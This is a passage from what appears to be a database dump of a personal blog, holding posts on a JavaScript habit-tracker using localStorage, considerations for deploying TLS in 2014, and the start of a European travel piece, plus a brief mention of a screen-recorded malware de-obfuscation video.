    <source src="https://assets.themetacity.com/video/foundmalwaredecode.webm" type=''video/webm;codecs="vp8, vorbis"'' data-fullscreen="true">
    <source src="https://assets.themetacity.com/video/foundmalwaredecode.mp4" type=''video/mp4;codec="avc1"'' data-fullscreen="true">
</video>','2014-02-09 22:09:28','2014-02-09 22:09:28','<p>Video test of screen recording while de-obfuscating some malware found at work</p>',NULL),
	 (9,'15 minute chains and local storage','15-minute-chains-and-local-storage','blog','<p>As an exercise in learning some more JavaScript, I decided to write a little goal progress monitor/tracker.</p>
<p>The initial idea is pretty straight forward: a checkbox that shows you if you have checked off the task for today and also shows the past week (or whatever) below it, forming a continuous chain. The idea is to not break the chain (of days completed).</p>
<p><img alt="Initial paper drawing of mockup of design. It shows a check-list of ideas and technologies to used." src="https://assets.themetacity.com/image/blog/15minchaininitialdesign.jpg" title="Inital mockup of design and a checklist of how to go about building it." /></p>
<p>The initial HTML is pretty straightforward with some divs representing each goal/activity to track, and some child divs representing how long you want to track. The H1 is both the name of the activity, and the key used to track it. We will see more on that below.</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;en&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>15 Minutes Chain<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">link</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;style.css&quot;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/css&quot;</span> <span class="na">media</span><span class="o">=</span><span class="s">&quot;screen&quot;</span><span class="p">/&gt;</span>
    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;maincontainer&quot;</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;chainContainer&quot;</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Stretching<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;today&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;chainContainer&quot;</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Piano<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;today&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;chainContainer&quot;</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Guitar<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;today&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;chainContainer&quot;</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Deutsch<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;today&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">h5</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;reset&quot;</span><span class="p">&gt;</span>Reset<span class="p">&lt;/</span><span class="nt">h5</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;script.js&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;application/javascript;version=1.7&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>


<p>The CSS is pretty straightforward too:</p>
<div class="codehilite"><pre><span></span><span class="p">@</span><span class="k">charset</span> <span class="s2">&quot;utf-8&quot;</span><span class="p">;</span>

<span class="nt">html</span> <span class="p">{</span>
    <span class="k">color</span><span class="p">:</span> <span class="mh">#BCBCBC</span><span class="p">;</span>
<span class="p">}</span>

<span class="nt">body</span> <span class="p">{</span>
    <span class="k">margin</span><span class="p">:</span> <span class="mi">100</span><span class="kt">px</span> <span class="kc">auto</span> <span class="kc">auto</span><span class="p">;</span>
    <span class="k">width</span><span class="p">:</span> <span class="mi">800</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">.</span><span class="nc">chainContainer</span> <span class="p">{</span>
    <span class="k">width</span><span class="p">:</span> <span class="mi">25</span><span class="kt">%</span><span class="p">;</span>
    <span class="k">float</span><span class="p">:</span> <span class="kc">left</span><span class="p">;</span>
    <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">.</span><span class="nc">chainLink</span> <span class="p">{</span>
    <span class="k">height</span><span class="p">:</span> <span class="mi">50</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">width</span><span class="p">:</span> <span class="mi">50</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">margin-top</span><span class="p">:</span> <span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
    <span class="k">margin-left</span><span class="p">:</span> <span class="kc">auto</span><span class="p">;</span>
    <span class="k">margin-right</span><span class="p">:</span> <span class="kc">auto</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">.</span><span class="nc">today</span> <span class="p">{</span>
    <span class="k">border</span><span class="p">:</span> <span class="kc">solid</span> <span class="kc">gray</span><span class="p">;</span>
    <span class="kp">-moz-</span><span class="k">box-sizing</span><span class="p">:</span> <span class="kc">border-box</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">.</span><span class="nc">done</span> <span class="p">{</span>
    <span class="k">background-color</span><span class="p">:</span> <span class="kc">green</span><span class="p">;</span>
<span class="p">}</span>

<span class="p">.</span><span class="nc">notdone</span> <span class="p">{</span>
    <span class="k">background-color</span><span class="p">:</span> <span class="kc">red</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>You will notice that there are a few Firefox specific things going on. My primary browser is Firefox, so I made this for that. The <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/box-sizing">first is the -moz-box-sizing</a> in the CSS mostly to make all the boxes appear the same when there is a border and when there is not without messing with border and widths.</p>
<p>The second is the use of <code>&lt;let&gt;</code>. This is a JavaScript 1.7 change that I used because I wanted to see how it would affect things. To make it work (at the time of writing) you need to have the <code>type="application/javascript;version=1.7"</code> in your script tag.</p>
<p>The interesting part below is the use of <code>localStorage</code> to save the state of your progress. localStorage is a way to assign key:value store bound to the <a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/origin-0.html">origin</a> with 5mb to play with.</p>
<div class="codehilite"><pre><span></span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="s2">&quot;use strict&quot;</span><span class="p">;</span>

    <span class="kd">function</span> <span class="nx">compareDates</span><span class="p">(</span><span class="nx">date1</span><span class="p">,</span> <span class="nx">date2</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">date1</span> <span class="o">-</span> <span class="nx">date2</span><span class="p">);</span>
        <span class="k">return</span> <span class="p">(</span><span class="nx">date1</span> <span class="o">-</span> <span class="nx">date2</span><span class="p">)</span> <span class="o">/</span> <span class="mf">86400000</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">jobs</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s2">&quot;chainContainer&quot;</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">todayDate</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
    <span class="nx">todayDate</span><span class="p">.</span><span class="nx">setHours</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="mf">0</span><span class="p">);</span>
    <span class="nx">todayDate</span><span class="p">.</span><span class="nx">setDate</span><span class="p">(</span><span class="nx">todayDate</span><span class="p">.</span><span class="nx">getDate</span><span class="p">());</span>

    <span class="c1">//  The chainContainer is setup to have an &lt;h1&gt; as the first element ([0]).</span>
    <span class="c1">//  This element&#39;s text act&#39;s as the local storage key.</span>
    <span class="c1">//  I.E. Changing the text will lose your history.</span>
    <span class="c1">//  You can have as many of them as you want (fit on a page). Just copy a different one and change the text etc.</span>
    <span class="c1">//  Chain links start at [1] and go for as many as you want. 1 per day though. Unless you want to change that.</span>
    <span class="kd">let</span> <span class="nx">jobHistories</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">jobs</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">jobHistories</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">textContent</span><span class="p">);</span>

        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mf">1</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span> <span class="o">+=</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="nx">j</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">&quot;chainLink&quot;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>


    <span class="c1">//  Click on &#39;today&#39;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">jobs</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="mf">1</span><span class="p">].</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
            <span class="c1">// Serialise state to local storage</span>
            <span class="kd">let</span> <span class="nx">state</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">children</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">textContent</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">&quot;done&quot;</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="nx">state</span> <span class="o">===</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//  Nothing in local history yet</span>
                <span class="nx">state</span> <span class="o">=</span> <span class="p">[];</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">state</span> <span class="o">=</span> <span class="nx">state</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">todayDate</span><span class="p">.</span><span class="nx">toDateString</span><span class="p">())</span> <span class="o">===</span> <span class="o">-</span><span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">state</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">todayDate</span><span class="p">.</span><span class="nx">toDateString</span><span class="p">());</span>
                <span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">children</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">textContent</span><span class="p">,</span> <span class="nx">state</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">});</span>
    <span class="p">}</span>

    <span class="c1">//  Restore from state</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">jobs</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">prevState</span><span class="p">;</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nx">prevState</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">textContent</span><span class="p">).</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">);</span>
            <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">prevState</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span> <span class="o">+=</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">stateDate</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">prevState</span><span class="p">[</span><span class="nx">j</span><span class="p">]);</span>
                <span class="kd">let</span> <span class="nx">dateDiff</span> <span class="o">=</span> <span class="nx">compareDates</span><span class="p">(</span><span class="nx">todayDate</span><span class="p">,</span> <span class="nx">stateDate</span><span class="p">);</span>

                <span class="k">if</span> <span class="p">(</span><span class="nx">dateDiff</span> <span class="o">&gt;</span> <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mf">2</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">break</span><span class="p">;</span>  <span class="c1">// Array out of bounds</span>
                <span class="p">}</span>

                <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="nx">dateDiff</span> <span class="o">+</span> <span class="mf">1</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">&quot;done&quot;</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mf">2</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span> <span class="o">+=</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="nx">j</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">contains</span><span class="p">(</span><span class="s2">&quot;done&quot;</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="nx">j</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">&quot;notdone&quot;</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">TypeError</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//  No history yet</span>
            <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mf">2</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span> <span class="o">+=</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="nx">j</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">&quot;notdone&quot;</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">//  Reset the history</span>
    <span class="kd">let</span> <span class="nx">reset</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;reset&quot;</span><span class="p">);</span>
    <span class="nx">reset</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">jobs</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">localStorage</span><span class="p">.</span><span class="nx">clear</span><span class="p">(</span><span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">textContent</span><span class="p">);</span>
            <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mf">1</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span> <span class="o">+=</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="nx">j</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s2">&quot;done&quot;</span><span class="p">);</span>
                <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="nx">j</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s2">&quot;notdone&quot;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mf">2</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">j</span> <span class="o">+=</span> <span class="mf">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">jobs</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="nx">j</span><span class="p">].</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s2">&quot;notdone&quot;</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">});</span>
<span class="p">}());</span>
</pre></div>


<p>First interesting thing here is the use of the <code>&lt;H1&gt;</code> as the key part of the key:value pair. This has one nice side effect: adding and removing goals and changing them is straightforward and cheap. Just edit the HTML to add a new <code>chainContainer</code> or change the H1 of an existing one. Changing an existing one will make a new key but will not delete the previous one. That means if you change it back, the history come back with it. These keys are still at the users control though, and a history wipe will take them with it.</p>
<p>The next thing to look at is the values themselves. The store is key:value strings. So pushing in objects will convert them to strings. There are a couple of implications of this: there are ONLY strings and not boolean or date objects, and you need to manually de-serialise objects.</p>
<p>Manual de-serialisation is quite straightforward: JavaScript will generally call the <code>.toString()</code> method on whatever you push. In this case it is an array which is comma delimited. The de-serialisation is to split it on that comma, and you have strings of what was in your array. Great. Next step (in this case) is to change the strings back to date objects by calling <code>new Date(string);</code>. One gotcha here is to make sure that today''s date ignores the hours and minutes component. Otherwise, you end up comparing fractions of days with whole days, and you get the wrong answer even though it looks right.</p>
<p>The lot of this <a href="/github" title="Link to this project on GitHub">can be found on GitHub here</a>.</p>
<p>P.S. I am well aware of the inefficiencies of context switching.</p>','2014-02-14 22:11:15','2014-02-14 22:11:15','<p>Test of the local storage API in modern browsers with habit building to boot</p>',NULL),
	 (10,'Things to think about when implementing SSL/TLS on a public facing web server','things-to-think-about-when-implementing-ssl-tls-on-a-public-facing-website','blog','<h2 id="tldr-you-can-not-have-tls-12-and-a-commercial-ca-ecdhe-certificate-yet-if-you-want-to-have-a-public-facing-website">TLDR: you can not have TLS 1.2, and a commercial CA ECDHE certificate yet if you want to have a public facing website.</h2>
<p>Some things to think about when implementing site wide SSL/TLS. Remember that this was written in the early part of April 2014.</p>
<ol>
<li><a href="#signingauthorities">Signing authorities vs self signed</a></li>
<li><a href="#serversupport">Server support</a></li>
<li><a href="#browsersupport">Browser support</a></li>
</ol>
<h3 id="signingauthorities">Signing authorities vs self-signed</h3>

<p>If you go self-signed than you can do whatever you want, and you will be happy. However, if you want to use a CA you are stuck with RSA. At the time of writing I couldn''t find a CA that offered to sign a ECDSA certificate (at least for small commercial prices) although I image that it will come eventually.</p>
<p>If you try to have the CA''s system sign the certificate you just get an error, some more helpful than others.</p>
<h3 id="serversupport">Server support</h3>

<p>Apache support for ECDHE suites only landed in 2.3. Arch Linux rolled onto 2.4 in March but that is not very fun in a production setup. Debian is still on 2.2 and will go to 2.4 in Jessie (the current testing branch) aka Debian 8.0. This means a typical Debian system will not support ECDHE suites and PFS until probably late this year or even later.</p>
<p>nginx supports ECDHE suites as of now.</p>
<p>Windows, I have no idea (or particularly care to).</p>
<p>CORS filters need to be updated to put an ''https'' at the front. Most tutorials et al. do not mention this as it is not assumed to be plain http.</p>
<h3 id="browsersupport">Browser support</h3>

<p>Firefox just got public release support for TLS 1.2 in the 27.0 release. Chromium in the 30.0 release. Internet Explorer has it on version 11. Safari version 7 on OS X 10.9.</p>
<p>The one that might really hit you however is the search bots do not yet support TLS 1.2. GoogleBot (Oct 1013) only supports SSL 3.0 and TLS 1.0. If you do not support either of them then Google can not index your site (inc webmaster tools). If that is important to you then you might what to think about that.</p>
<p>Additionally, mixed content policy now means that if a secured page tries to lead an ''unsecured'' page (i.e., https:// loading something with the uri to http://) then the http:// element won''t be loaded. this includes images, video, audio, scripts, fonts, anything. These can even be inside elements that are otherwise secured. For example, I use Google web fonts extensively in SVGs around this site. The default embedding code is <code>&lt;link href=''http://fonts.googleapis.com/css?family=FontYouWant'' rel=''stylesheet'' type=''text/css''&gt;</code> which is unsecured. So change all of them to https:// and, they load again. N.B. the link that that goes to has unsecured content linked in it which is OK and loads fine (not sure if that should happen or not).</p>','2014-04-03 22:42:28','2014-04-03 22:42:28','<p>Testing out support for TLS 1.2</p>',NULL),
	 (11,'This is a list of interesting people we met on our recent trip to Europe','this-is-a-list-of-interesting-people-we-met-on-our-recent-trip-to-europe','blog','<h2 id="brown-dog-lady">Brown Dog Lady</h2>
<p>We were in Verona, walking along the river on our way to see the Dom and the top of the mountain when we crossed paths with an elderly lady being followed by an old brown dog carrying its own lead. Being a sucker for something that cute, we struck up a conversation with Brown Dog Lady. She had a wonderful knowledge of the city, with its Roman origins and customs (riding down the centre of town through both gates, which had been moved once cars became common), and the effects of World War 2 that persist to this day (seen in the scar that both blights and illuminates the <em>Ponte Pietra</em>).</p>
